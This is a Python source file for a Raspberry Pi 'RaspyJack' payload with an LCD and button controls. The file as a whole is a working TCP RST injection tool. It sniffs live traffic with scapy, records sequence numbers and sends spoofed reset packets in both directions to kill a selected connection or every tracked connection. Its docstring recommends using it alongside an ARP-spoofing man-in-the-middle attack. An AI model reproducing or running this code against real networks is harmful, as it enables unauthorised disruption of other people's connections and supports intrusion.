#!/usr/bin/env python3
"""
RaspyJack Payload -- TCP RST Injection
========================================
Author: 7h30th3r0n3

Sniff live TCP traffic to build a connection table, then inject TCP RST
packets (both directions) to tear down selected connections.

Flow:
  1) Sniff TCP segments to populate connection table (src:port -> dst:port)
  2) User scrolls and selects a connection
  3) Craft RST with correct seq numbers (sniffed from live traffic)
  4) Inject in both directions to guarantee teardown

Controls:
  OK        -- Kill selected connection
  UP / DOWN -- Scroll connection list
  KEY1      -- Refresh / rescan connections
  KEY2      -- Kill ALL connections
  KEY3      -- Exit

Setup: Works best during active MITM (e.g. ARP spoof in place).
"""

import os
import sys
import time
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import sniff, send, IP, TCP, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# Shared state (immutable-swap pattern via lock)
# ---------------------------------------------------------------------------
lock = threading.Lock()
connections = {}       # key: (src,sport,dst,dport) -> {seq_fwd, seq_rev, last_seen}
conn_keys = []         # ordered list of keys for display
scroll_pos = 0
selected_idx = 0
rst_sent = 0
status_msg = "Initializing..."
sniff_active = False
app_running = True


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _conn_key(src, sport, dst, dport):
    """Canonical key so both directions map to the same connection."""
    if (src, sport) < (dst, dport):
        return (src, sport, dst, dport)
    return (dst, dport, src, sport)


def _packet_handler(pkt):
    """Process a sniffed TCP packet and update connection table."""
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return
    ip = pkt[IP]
    tcp = pkt[TCP]
    if tcp.flags & 0x04:  # RST already — skip
        return
    key = _conn_key(ip.src, tcp.sport, ip.dst, tcp.dport)
    with lock:
        entry = connections.get(key, {
            "seq_fwd": 0, "seq_rev": 0, "last_seen": 0,
        })
        if (ip.src, tcp.sport) == (key[0], key[1]):
            entry["seq_fwd"] = tcp.seq + len(bytes(tcp.payload))
        else:
            entry["seq_rev"] = tcp.seq + len(bytes(tcp.payload))
        entry["last_seen"] = time.time()
        new_conns = dict(connections)
        new_conns[key] = entry
        connections.clear()
        connections.update(new_conns)


def _sniff_thread():
    """Continuously sniff TCP traffic."""
    global sniff_active
    with lock:
        sniff_active_local = True
    sniff_active = True
    try:
        sniff(
            filter="tcp",
            prn=_packet_handler,
            store=False,
            stop_filter=lambda _: not app_running,
            timeout=0,
        )
    except Exception:
        pass
    finally:
        sniff_active = False


def _refresh_keys():
    """Rebuild the ordered key list from connections, prune stale."""
    global conn_keys
    now = time.time()
    with lock:
        stale = [k for k, v in connections.items() if now - v["last_seen"] > 120]
        new_conns = {k: v for k, v in connections.items() if k not in stale}
        connections.clear()
        connections.update(new_conns)
        conn_keys = sorted(connections.keys(), key=lambda k: connections[k]["last_seen"], reverse=True)


def _send_rst(key):
    """Send RST in both directions for a connection."""
    global rst_sent
    src, sport, dst, dport = key
    with lock:
        entry = connections.get(key)
    if not entry:
        return
    try:
        pkt_fwd = IP(src=src, dst=dst) / TCP(
            sport=sport, dport=dport, flags="R",
            seq=entry["seq_fwd"],
        )
        pkt_rev = IP(src=dst, dst=src) / TCP(
            sport=dport, dport=sport, flags="R",
            seq=entry["seq_rev"],
        )
        send(pkt_fwd, verbose=False)
        send(pkt_rev, verbose=False)
        with lock:
            rst_sent += 2
            if key in connections:
                new_conns = {k: v for k, v in connections.items() if k != key}
                connections.clear()
                connections.update(new_conns)
    except Exception:
        pass


def _kill_all():
    """RST every tracked connection."""
    with lock:
        keys = list(connections.keys())
    for k in keys:
        if not app_running:
            break
        _send_rst(k)
    _refresh_keys()


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "TCP RST INJECT", fill="RED", font=font)

    with lock:
        st = status_msg
        rsts = rst_sent
        keys = list(conn_keys)
        sp = scroll_pos
        si = selected_idx

    draw.text((2, 14), st[:22], fill="WHITE", font=font)
    draw.text((80, 2), f"RST:{rsts}", fill="YELLOW", font=font)

    y = 28
    visible = keys[sp:sp + ROWS_VISIBLE]
    for i, key in enumerate(visible):
        real_i = sp + i
        prefix = ">" if real_i == si else " "
        color = "YELLOW" if real_i == si else "WHITE"
        label = f"{prefix}{key[0].split('.')[-1]}:{key[1]}->{key[2].split('.')[-1]}:{key[3]}"
        draw.text((2, y), label[:22], fill=color, font=font)
        y += 14

    if not keys:
        draw.text((2, 56), "No connections yet", fill="GRAY", font=font)

    draw.text((2, 116), "OK=kill K1=ref K2=all", fill="GRAY", font=font)
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    global app_running, scroll_pos, selected_idx, status_msg

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    try:
        with lock:
            status_msg = "Sniffing TCP..."

        sniffer = threading.Thread(target=_sniff_thread, daemon=True)
        sniffer.start()
        _draw_screen()

        last_refresh = 0

        while app_running:
            now = time.time()
            if now - last_refresh > 2:
                _refresh_keys()
                last_refresh = now

            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                with lock:
                    keys = list(conn_keys)
                    si = selected_idx
                if 0 <= si < len(keys):
                    with lock:
                        status_msg = "Sending RST..."
                    threading.Thread(
                        target=_send_rst, args=(keys[si],), daemon=True,
                    ).start()
                    time.sleep(0.3)
                    _refresh_keys()
                    with lock:
                        status_msg = "RST sent"

            elif btn == "UP":
                with lock:
                    if selected_idx > 0:
                        selected_idx -= 1
                    if selected_idx < scroll_pos:
                        scroll_pos = selected_idx

            elif btn == "DOWN":
                with lock:
                    if selected_idx < len(conn_keys) - 1:
                        selected_idx += 1
                    if selected_idx >= scroll_pos + ROWS_VISIBLE:
                        scroll_pos = selected_idx - ROWS_VISIBLE + 1

            elif btn == "KEY1":
                with lock:
                    connections.clear()
                    conn_keys.clear()
                    scroll_pos = 0
                    selected_idx = 0
                    status_msg = "Refreshed — sniffing..."

            elif btn == "KEY2":
                with lock:
                    status_msg = "Killing ALL..."
                threading.Thread(target=_kill_all, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "RST Inject stopped", fill="YELLOW", font=font)
            d.text((10, 66), f"Total RST: {rst_sent}", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
